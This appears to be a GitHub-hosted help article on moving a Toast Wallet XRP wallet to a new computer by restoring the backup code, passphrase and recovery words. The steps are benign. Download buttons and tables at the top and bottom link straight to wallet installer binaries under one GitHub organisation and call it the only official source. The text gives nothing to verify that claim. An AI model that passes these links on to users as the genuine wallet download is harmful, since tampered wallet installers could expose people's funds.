<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Restore Toast Wallet on a new computer</h1>

<p align="center">Install the latest version and restore your backup on fresh hardware.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

On the new computer, install the [latest Toast Wallet release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), choose Restore an Existing Wallet, then Restore Backup, and enter your backup code with the passphrase or six recovery words that belong to it. Your XRP never moves; the new computer simply gains access to it.

## 👀 You'll see this if

- You bought a new laptop and want your Toast Wallet on it.
- You are switching from Windows to macOS or Linux, or the other way round.
- Your old computer still works, but you are retiring it.
- A technician reset your computer and the wallet is gone.

## 🤔 Why it matters

Moving a wallet feels risky because it seems that something valuable has to travel from one machine to the other. In reality, nothing valuable travels. Your XRP is on the XRP Ledger. What you bring to the new computer is the ability to sign for it, packed inside your encrypted backup code.

That makes the move simple and safe when done in the right order. Problems arise mainly when people wipe the old computer before confirming the backup works, or when they use an old backup that is missing newer accounts.

## 🧭 Before you start

Keep the old computer untouched until the end of this guide. Find your newest backup code, your passphrase and your six recovery words, and make sure the new computer is set up with its own user account, updates installed and no remote-access software running.

## 🛠️ Fix: move to a new computer step by step

1. **On the old computer, make a fresh backup.** If it still works, open Toast Wallet, go to Settings, choose Backup Wallet and copy the new code to paper. Note all account addresses beginning with `r`.
2. **Do not wipe the old computer yet.** Keep it until the new one shows all your accounts.
3. **On the new computer, install the latest desktop wallet.** Download from the official release and check the checksum. On a Mac, follow [install Toast Wallet on Mac](https://github.com/Toast-Wallet/learn/blob/main/how-to/install-toast-wallet-on-mac.md); on Windows, follow [install Toast Wallet on Windows](https://github.com/Toast-Wallet/learn/blob/main/how-to/install-toast-wallet-on-windows.md).
4. **Choose Restore an Existing Wallet, then Restore Backup.** Enter the backup code.
5. **Confirm with the passphrase or six words.** Use the ones that belong to this backup.
6. **Set a PIN for the new computer.**
7. **Compare the addresses.** Every address from your note should appear. Balances load from the network.
8. **Make another backup from the new computer.** Store it as your current backup.
9. **Only then retire the old computer.** Remove the program and, if you are giving the computer away, reset it fully.

The restore screens are described in detail in [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).

## ⚠️ Common mistakes

- Wiping or selling the old computer before checking that the new one shows every account.
- Restoring a backup that is older than the newest accounts, then believing those accounts have vanished.
- Copying the backup code through email or a chat app "just for a minute" to move it between machines.
- Installing from a search result instead of the official release on the new machine.
- Keeping both computers active long term and forgetting which one holds the newest backup.

## 🔁 If that did not work

- **Accounts are missing.** The backup is older than those accounts. Make a new backup on the old computer if it still works, or see [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md).
- **The old computer is dead or lost.** Use your newest backup code and read [Toast Wallet lost computer recovery](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-lost-computer-recovery.md).
- **The passphrase fails.** Use the passphrase from the time of that backup.

## 🛡️ Prevention

Make a backup whenever your wallet changes, not only when you move computers. Keep the backup on paper, never inside the computer you are leaving. Avoid moving wallet data with USB sticks, cloud folders or email; the backup code exists precisely so you do not need to.

## 📝 Good to know

Moving between operating systems works the same way. A backup code made on Windows restores on macOS or Linux, and the other way round, as long as you use the latest desktop wallet. The only things that differ are how you install the program and where the operating system keeps the app; the restore screens and your addresses stay the same.

## 🔍 A closer look at preparing the new computer

A new computer is a fresh start, so give it a good one before the wallet arrives. Install all operating system updates, set up your own user account with a strong password and turn on disk encryption if your system offers it. Avoid installing remote-control or "PC helper" tools. Then install Toast Wallet from the official release and restore. Starting from a clean, updated system means your wallet lives in a safer place than it did before.

If the old and new computers are both available, resist the urge to move files between them with a USB stick or cloud folder. The backup code was designed so you never need to carry wallet files around. Typing the code on the new machine is slower, but it leaves no extra copies of your wallet scattered across drives and accounts.

## ❓ FAQ

<details>
<summary>Can I use the wallet on both computers?</summary>

You can restore the same backup on more than one computer, but keeping one main computer makes it easier to stay organised.

</details>

<details>
<summary>Do I need internet to restore?</summary>

The restore itself happens in the app. You need a connection to see balances and send.

</details>

<details>
<summary>Will fees apply when I move computers?</summary>

No. Restoring is not a transaction and does not use the network.

</details>

> [!WARNING]
> Never send your backup code to yourself by email or chat to move it. Write it on paper and type it on the new computer.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
| [Install Toast Wallet on Mac](https://github.com/Toast-Wallet/learn/blob/main/how-to/install-toast-wallet-on-mac.md) | Set up the macOS .dmg without switching off any Mac security. |
| [Toast Wallet lost computer recovery](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-lost-computer-recovery.md) | What to do after a stolen, broken or wiped computer. |
| [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md) | Why some accounts do not appear and how to bring them back. |
